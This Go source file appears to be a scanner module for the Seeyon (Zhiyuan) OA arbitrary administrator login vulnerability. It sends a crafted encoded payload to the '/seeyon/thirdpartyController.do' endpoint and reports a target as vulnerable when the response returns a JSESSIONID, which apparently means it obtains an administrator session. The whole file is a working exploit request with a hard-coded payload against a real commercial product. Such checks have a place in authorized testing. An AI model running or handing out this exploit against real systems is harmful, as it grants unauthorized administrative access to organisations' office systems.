package zhiyuan_login

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/seeyon/thirdpartyController.do"
	data := "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":   UA,
			"Content-Type": "application/x-www-form-urlencoded",
		}).
		SetBodyString(data).
		Post(vulnUrl)

	if err == nil && resp.StatusCode == 200 {
		// Check if the response body contains "JSESSIONID" keyword
		return strings.Contains(resp.String(), "JSESSIONID")
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		color.Green.Println("[+]	致远OA任意管理员登陆漏洞存在 -> ", url)
	} else {
		color.Red.Println("[-]	致远OA任意管理员登陆漏洞不存在")
	}
}
